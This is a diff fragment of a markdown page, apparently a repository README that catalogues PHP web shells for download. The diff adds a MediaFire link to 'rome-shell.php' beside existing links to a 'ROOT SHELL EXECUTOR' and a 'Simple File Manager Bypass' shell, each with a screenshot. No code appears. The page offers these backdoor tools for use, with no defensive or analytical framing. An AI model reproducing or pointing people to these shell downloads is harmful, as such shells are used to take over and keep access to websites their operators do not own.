@@ -479,6 +479,9 @@ Date : 10 January 2023 [![Windows Badge](https://img.shields.io/badge/Windows-bl
  # <a href="https://www.mediafire.com/file/zbbho26us99vmra/root.php/file">ROOT SHELL EXECUTOR </a>
 <img src="https://i.imgur.com/fife2dB.png" alt="beruangsalju profile">
 
+# <a href="https://www.mediafire.com/file/isn2cb34v38ipl0/rome-shell.php/file"> rome shell </a>
+<img src="https://i.imgur.com/ZaVdWt3.png" alt="beruangsalju profile">
+
 # <a href="https://www.mediafire.com/file/ma0fjtnvp7jpchd/sfm-bypass_shell.php/file">Simple File Manager Bypass</a>
 <img src="https://imgur.com/uiB4HT6.png" alt="beruangsalju profile">
 
